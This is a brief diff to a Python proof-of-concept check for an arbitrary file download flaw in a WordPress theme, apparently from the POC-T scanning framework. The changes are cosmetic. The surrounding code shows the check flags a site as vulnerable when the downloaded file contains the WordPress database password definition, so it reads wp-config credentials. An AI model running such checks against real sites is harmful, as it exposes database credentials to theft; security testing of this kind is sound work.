@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# author = i@cdxy.me
 # project = https://github.com/Xyntax/POC-T
+# author = i@cdxy.me
 
 """
 WordPress theme ypo-theme Arbitrary File Download Vulnerability
@@ -28,6 +28,5 @@ def poc(url):
         if "define('DB_PASSWORD'" in r and '@package WordPress' in r:
             return target
     except Exception, e:
-        # print e
         pass
     return False
